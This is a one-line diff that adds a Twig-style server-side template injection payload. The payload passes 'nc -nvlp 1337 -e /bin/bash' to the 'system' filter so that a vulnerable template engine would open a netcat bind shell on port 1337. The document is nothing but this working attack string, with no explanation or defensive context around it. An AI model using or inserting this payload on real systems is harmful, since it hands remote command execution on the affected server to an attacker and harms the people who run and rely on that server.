@@ -1,0 +1,1 @@
+{{['nc -nvlp 1337 -e /bin/bash']|filter('system')}}
